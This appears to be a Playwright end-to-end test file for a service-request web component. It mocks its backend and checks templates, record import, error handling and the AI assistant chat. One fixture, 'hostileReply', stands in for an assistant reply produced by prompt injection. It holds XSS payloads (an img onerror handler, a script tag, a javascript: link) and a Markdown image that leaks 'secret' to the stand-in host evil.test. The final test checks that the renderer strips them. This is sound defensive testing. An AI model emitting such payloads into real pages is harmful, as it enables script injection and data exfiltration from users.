import { test, expect } from "@playwright/test";
import { readFileSync } from "node:fs";
import type { Bootstrap, LdsData } from "../../src/types";
const fixture: Bootstrap = JSON.parse(
  readFileSync(
    new URL("../../backend/Esr.Api/seed.json", import.meta.url),
    "utf8",
  ),
);
/** What the backend returns from CRACN for the demo JCN (see mocks/cracn). */
const lds: Record<string, LdsData> = {
  "JCN-260184": {
    workStatement: "Inspect auxiliary seawater pump coupling",
    refit: "A014",
    component: "ASW-P-02 / TSN-10482",
    location: "Auxiliary machinery space",
  },
};
/** Rich Markdown mixed with the HTML an injected prompt might coax out of a model. */
const hostileReply = [
  "### Steps",
  "",
  "1. **Inspect** the `coupling` face",
  "2. Measure insert wear",
  "",
  "| Part | Limit |",
  "| --- | --- |",
  "| Insert | 0.5 mm |",
  "",
  '<img src="x" onerror="window.__pwned = 1"><script>window.__pwned = 2</script>',
  "![pixel](https://evil.test/p.png?d=secret) [bad](javascript:window.__pwned=3) [spec](https://example.test)",
].join("\n");
test.beforeEach(async ({ page }) => {
  const data = structuredClone(fixture);
  let user = data.users.find((u) => u.id === "engineer")!;
  await page.route("**/api/**", async (route) => {
    const request = route.request(),
      path = new URL(request.url()).pathname;
    const body = request.postDataJSON();
    let result;
    if (path === "/api/demo/users") result = data.users;
    else if (path === "/api/demo/session") {
      user = data.users.find((u) => u.id === body.userId)!;
      result = { user, token: "synthetic-test-token" };
    } else if (path === "/api/bootstrap") result = { ...data, user };
    else if (path === "/api/lds")
      result = lds[new URL(request.url()).searchParams.get("jcn") || ""];
    else if (path === "/api/history/search")
      result = {
        summary: "Synthetic test summary of coupling wear.",
        matches: data.records
          .filter((r) => r.status === "ESR Closed")
          .map((r) => ({ ...r, similarity: 80 })),
      };
    else if (path === "/api/assistant/chat")
      result = { reply: hostileReply, model: "fixture-model", mock: false };
    else if (path.endsWith("/draft")) {
      const record = data.records.find((r) => r.id === path.split("/")[3]);
      Object.assign(record!, body);
      result = record;
    } else if (path.endsWith("/resolve"))
      return route.fulfill({
        status: 400,
        json: { error: "DFS reference is required." },
      });
    else
      return route.fulfill({
        status: 404,
        json: { error: "Not part of this component fixture." },
      });
    await route.fulfill({ json: result });
  });
});
test("isolated component loads, filters, navigates, and lays out at mobile width", async ({
  page,
}) => {
  await page.goto("/");
  await expect(
    page.getByRole("heading", { name: "Service requests" }),
  ).toBeVisible();
  await expect(page.locator("tbody tr")).toHaveCount(6);
  await page.screenshot({
    path: "artifacts/desktop-workspace.png",
    fullPage: true,
  });
  await page.getByLabel("Search requests").fill("SUBSAFE");
  await expect(page.locator("tbody tr")).toHaveCount(1);
  await page.getByRole("button", { name: "Template library" }).click();
  await expect(page.locator(".template-card")).toHaveCount(3);
  await page.setViewportSize({ width: 390, height: 844 });
  await page.getByRole("button", { name: "All requests" }).click();
  await page.screenshot({
    path: "artifacts/mobile-workspace.png",
    fullPage: true,
  });
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= window.innerWidth,
    ),
  ).toBe(true);
});
test("editor inserts approved template, answers sequential prompts, and saves", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .getByRole("button", { name: "Open Auxiliary seawater pump" })
    .click();
  await page.getByRole("tab", { name: "Resolution", exact: true }).click();
  await page.getByRole("button", { name: "Insert template" }).click();
  await page
    .getByRole("dialog")
    .getByRole("button", { name: "Insert template" })
    .first()
    .click();
  await expect(page.getByLabel("Resolution", { exact: true })).toHaveValue(
    /Isolate the affected component/,
  );
  await page.getByLabel("1. DFS Required?").selectOption("no");
  await page.getByLabel("2. TVD Required?").selectOption("yes");
  await page.getByLabel("TVD reference / document number").fill("TVD-DEMO-1");
  await page.getByRole("button", { name: "Save draft", exact: true }).click();
  await expect(page.getByRole("status")).toContainText("Changes saved");
  await page.getByRole("button", { name: "Summarize & search" }).click();
  await expect(
    page.getByRole("heading", { name: "Conceptual summary" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Use in draft" }).first().click();
  await expect(page.getByRole("status")).toContainText(
    "Historical text inserted",
  );
});
test("new request LDS import, modal keyboard and API errors", async ({
  page,
}) => {
  await page.goto("/");
  await page.getByRole("button", { name: "New request" }).click();
  await page.getByLabel("Job Control Number").fill("JCN-260184");
  await page.getByRole("button", { name: "Import LDS" }).click();
  await expect(page.locator(".lds-result")).toContainText("ASW-P-02");
  await page.keyboard.press("Escape");
  await expect(page.getByRole("dialog")).toBeHidden();
  await page
    .getByRole("button", { name: "Open Auxiliary seawater pump" })
    .click();
  await page
    .getByRole("button", { name: "Sign & submit for approval" })
    .click();
  await page.getByRole("button", { name: "Confirm & sign" }).click();
  await expect(page.getByRole("alert")).toContainText(
    "DFS reference is required",
  );
  await expect(page.getByRole("dialog")).toBeVisible();
});
test("built package bundle boots independently of Vue host source", async ({
  page,
}) => {
  await page.route("**/host/main.ts", (route) =>
    route.fulfill({
      contentType: "text/javascript",
      body: `import '/dist/component/esr-workspace.js'; document.querySelector('esr-workspace').tokenProvider = () => 'test-token';`,
    }),
  );
  await page.goto("/");
  await expect(
    page.getByRole("heading", { name: "Service requests" }),
  ).toBeVisible();
  await expect(page.locator("tbody tr")).toHaveCount(6);
});

test("assistant chat renders Markdown and strips unsafe HTML in a real browser", async ({
  page,
}) => {
  await page.goto("/");
  await page
    .getByRole("button", { name: "Open Auxiliary seawater pump" })
    .click();
  await page.getByRole("tab", { name: "Resolution", exact: true }).click();
  await page.getByLabel("Message").fill("What should I inspect?");
  await page.getByRole("button", { name: "Send", exact: true }).click();
  const bubble = page.locator(".chat-message.assistant .chat-bubble");
  await expect(bubble.locator("h3")).toHaveText("Steps");
  await expect(bubble.locator("ol > li")).toHaveCount(2);
  await expect(bubble.locator("strong")).toHaveText("Inspect");
  await expect(bubble.locator("table td").first()).toHaveText("Insert");
  await expect(
    bubble.locator('a[href="https://example.test"]'),
  ).toHaveAttribute("rel", "noopener noreferrer");
  const html = await bubble.innerHTML();
  expect(html).not.toMatch(/<img|<script|onerror|javascript:|evil\.test/);
  expect(
    await page.evaluate(() => (window as { __pwned?: number }).__pwned),
  ).toBeUndefined();
  await page.getByRole("button", { name: "Add to rationale" }).click();
  await expect(page.getByLabel("Engineering rationale")).toHaveValue(
    /1\. Inspect the coupling face/,
  );
});
